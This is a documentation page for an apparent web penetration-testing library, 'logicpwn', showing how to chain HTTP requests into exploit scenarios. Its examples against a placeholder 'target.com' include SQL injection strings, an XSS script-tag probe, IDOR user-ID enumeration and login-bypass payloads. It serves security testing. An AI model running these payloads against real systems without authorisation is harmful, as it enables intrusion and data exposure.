---
title: Exploit Engine
description: Chain exploits and execute complex attack scenarios
category: Guides
sidebar:
  order: 3
---

import { Card, CardGrid, Steps, TabItem, Tabs } from '@astrojs/starlight/components';

## Quick Start

The Exploit Engine allows you to chain multiple exploits into complex attack scenarios.

```python
from logicpwn.core.exploit_engine import ExploitChain, ExploitStep, run_exploit_chain
from logicpwn.core.runner import HttpRunner

# Create an exploit chain
chain = ExploitChain(
    name="IDOR Test",
    description="Test for IDOR vulnerabilities"
)

# Add exploit steps
chain.add_step(
    name="Test User Access",
    method="GET",
    url="https://target.com/api/users/1",
    expected_status=200
)

# Execute the chain
runner = HttpRunner()
results = run_exploit_chain(chain, runner=runner)
```

## Basic Exploit Chain

```python
from logicpwn.core.exploit_engine import ExploitChain, ExploitStep

# Create chain
chain = ExploitChain(
    name="SQL Injection Test",
    description="Test for SQL injection vulnerabilities"
)

# Add steps
chain.add_step(
    name="Login",
    method="POST",
    url="https://target.com/login",
    data={"username": "admin", "password": "password"},
    expected_status=200
)

chain.add_step(
    name="SQL Injection",
    method="GET",
    url="https://target.com/search?q=1' OR '1'='1",
    expected_status=200
)

# Execute
results = run_exploit_chain(chain)
```

## Async Execution

```python
import asyncio
from logicpwn.core.exploit_engine import async_run_exploit_chain

async def run_async_chain():
    chain = ExploitChain(
        name="Async Test",
        description="Async exploit chain"
    )

    chain.add_step(
        name="Test Endpoint",
        method="GET",
        url="https://httpbin.org/get"
    )

    # Async execution
    results = await async_run_exploit_chain(chain)
    return results

# Run async chain
results = asyncio.run(run_async_chain())
```

## YAML Configuration

Create exploit chains from YAML files:

```yaml
# exploit_chain.yaml
name: "XSS Test Chain"
description: "Test for XSS vulnerabilities"
steps:
  - name: "Login"
    method: "POST"
    url: "https://target.com/login"
    data:
      username: "admin"
      password: "password"
    expected_status: 200

  - name: "XSS Test"
    method: "GET"
    url: "https://target.com/search?q=<script>alert('XSS')</script>"
    expected_status: 200
```

```python
# Load from YAML
from logicpwn.core.exploit_engine import load_exploit_chain_from_file

chain = load_exploit_chain_from_file("exploit_chain.yaml")
results = run_exploit_chain(chain)
```

## Advanced Features

### Conditional Execution

```python
# Execute steps based on previous results
chain = ExploitChain("Conditional Test")

chain.add_step(
    name="Check Access",
    method="GET",
    url="https://target.com/admin",
    expected_status=200,
    success_indicators=["Admin Panel"]
)

# Only execute if previous step succeeded
chain.add_step(
    name="Admin Action",
    method="POST",
    url="https://target.com/admin/users",
    data={"action": "create", "username": "test"},
    depends_on="Check Access"
)
```

### Custom Payloads

```python
# Generate custom payloads
from logicpwn.core.exploit_engine import PayloadGenerator

generator = PayloadGenerator()

# SQL injection payloads
sql_payloads = generator.generate_sql_injection_payloads()
for payload in sql_payloads:
    chain.add_step(
        name=f"SQL Test: {payload}",
        method="GET",
        url=f"https://target.com/search?q={payload}"
    )
```

### Security Validation

```python
from logicpwn.core.exploit_engine import SecurityValidator

# Validate security controls
validator = SecurityValidator()

# Check for security headers
security_checks = validator.validate_response_headers(response)
if not security_checks["x_frame_options"]:
    print("Missing X-Frame-Options header")

# Check for authentication bypass
auth_checks = validator.validate_authentication(response)
if auth_checks["bypass_detected"]:
    print("Authentication bypass detected")
```

## Common Patterns

<CardGrid>
<Card title="IDOR Testing" icon="key">
```python
# Test for IDOR vulnerabilities
chain = ExploitChain("IDOR Test")

# Test with different user IDs
for user_id in [1, 2, 3, 999]:
    chain.add_step(
        name=f"Test User {user_id}",
        method="GET",
        url=f"https://target.com/api/users/{user_id}",
        expected_status=200
    )
```
</Card>

<Card title="Authentication Bypass" icon="shield">
```python
# Test authentication bypass
chain = ExploitChain("Auth Bypass Test")

# Test different bypass techniques
bypass_techniques = [
    "admin",
    "admin'--",
    "admin' OR '1'='1",
    "admin' UNION SELECT 1--"
]

for technique in bypass_techniques:
    chain.add_step(
        name=f"Bypass: {technique}",
        method="POST",
        url="https://target.com/login",
        data={"username": technique, "password": "anything"}
    )
```
</Card>

<Card title="Session Management" icon="session">
```python
# Test session management
chain = ExploitChain("Session Test")

# Login first
chain.add_step(
    name="Login",
    method="POST",
    url="https://target.com/login",
    data={"username": "user", "password": "pass"}
)

# Test session persistence
chain.add_step(
    name="Access Protected",
    method="GET",
    url="https://target.com/protected"
)
```
</Card>
</CardGrid>

## Integration with Other Modules

```python
# Use with authentication
from logicpwn.core.auth import authenticate_session, AuthConfig

# Authenticate first
auth_config = AuthConfig(
    url="https://target.com/login",
    method="POST",
    credentials={"username": "user", "password": "pass"}
)
session = authenticate_session(auth_config)

# Use authenticated session with exploit engine
runner = HttpRunner()
runner.session = session

chain = ExploitChain("Authenticated Test")
chain.add_step(
    name="Protected Access",
    method="GET",
    url="https://target.com/protected"
)

results = run_exploit_chain(chain, runner=runner)
```

## Best Practices

1. **Start simple** with basic exploit chains
2. **Use conditional execution** for complex scenarios
3. **Validate results** with success indicators
4. **Handle errors gracefully** in your chains
5. **Use YAML files** for complex configurations
6. **Test incrementally** to isolate issues

## Troubleshooting

- **Chain fails**: Check URLs and expected status codes
- **Authentication issues**: Ensure proper session handling
- **Timeout errors**: Increase timeout values
- **Import errors**: Check module dependencies
